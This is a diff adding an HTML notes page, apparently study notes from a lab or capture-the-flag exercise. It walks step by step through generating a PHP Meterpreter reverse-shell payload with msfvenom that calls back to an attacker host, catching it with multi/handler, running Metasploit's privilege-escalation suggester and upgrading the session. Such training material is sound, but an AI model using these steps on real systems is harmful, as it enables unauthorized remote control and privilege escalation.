@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>METASPLOIT</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>METASPLOIT</h1><br/><p>in first way i will create a msvenom, we know that the machine have php so i will create it with the payload:</p><p></p><p>php/meterpreter/reverse_tcp</p><p> </p><p> then i specify the LHOST and the LPORT</p><p> </p><p> command:</p><p> </p><p> msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.51 LPORT=443  &gt; venom.php</p><p> </p><p> then to listen the call i will use MSFCONSOLE </p><p> </p><p> command:</p><p> </p><p> msfconsole</p><p> </p><p> *it start*</p><p> </p><p>when it start i have to ‘use exploit/multi/handler’</p><p> </p><p> then set the same payload ,LHOST and LPORT</p><p> </p><p> execute:</p><p> </p><p>&#39;EXPLOIT&#39;</p><p></p><p>now execute the php that venom create on the victim machine, it will create a meterpreter session, there i can get the ‘shell mode’</p><p></p><p>i will enumerate the privilage scalation (if there are some way to get the root) with a tool of metasploit called ‘suggester’</p><p></p><p>to do this in first way i have to exit the shell mode with ‘exit’ and then on meterpreter hit ‘background’ and i will come back in msfconsole letting the meterpreter on background.</p><p></p><p>there, on msfconsole, use this command to get the suggester:</p><p></p><p>search suggester</p><p></p><p>use 0 (to use the suggester)</p><p></p><p>show options (to see what i have to fill)</p><p></p><p>fill the options that u have to fill, in this case the session that is meterpreter</p><p></p><p>then use the command ‘run’</p><p></p><p>it the output was bad, try to upgrade the shell to a binary shell, to get that you can use the follow command:</p><p></p><p>sessions -u 1</p><p></p><p>-u is for ‘upgrade’</p><p></p><p>1 is for the session that i want to upgrade</p></div>
+</body>
+</html>
